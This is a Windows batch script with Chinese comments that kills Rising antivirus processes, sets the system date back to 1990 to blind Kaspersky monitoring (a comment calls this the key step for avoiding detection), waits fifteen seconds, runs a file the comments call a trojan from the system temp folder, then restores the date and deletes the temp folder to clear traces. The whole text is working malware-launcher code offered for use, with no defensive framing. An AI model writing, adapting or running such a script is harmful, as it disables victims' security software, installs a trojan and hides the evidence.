::======杀进程使瑞星监控失效============
@ECHO OFF

knlps.exe -l >PID.txt
::列出PID值


FINDSTR /i "RavMon.exe" PID.txt >>RAV.txt
FINDSTR /i "RavMonD.exe" PID.txt >>RAV.txt
FINDSTR /i "CCenter.exe" PID.txt >>RAV.txt
::查找瑞星进程字符串


FOR /F "eol=; tokens=1 delims= " %%1 in (RAV.txt) do knlps.exe -k %%1

::======修改系统时间使卡巴监控失效============
set date=%date%                            这句是关键 破卡巴查杀的 程序流（没这句被杀）  

date 1990-01-01

date 1990-01-01

::========倒计时等待15秒======================  
@echo off & setlocal enableextensions
echo WScript.Sleep 1000 > %temp%.\tmp$$$.vbs
set /a i = 15
:Timeout
if %i% == 0 goto Next
setlocal
set /a i = %i% - 1
cscript //nologo %temp%.\tmp$$$.vbs
goto Timeout
goto End

::===========倒计时等待结束后运行木马=============
:Next
%systemroot%\temp\11.exe

for %%f in (%temp%.\tmp$$$.vbs*) do del %%f

::======恢复时间(卡巴监控)=======================
date 2007-10-27	aaa
date %date% 	aaa

::=========清除痕迹============================
RD /S /Q %systemroot%\temp\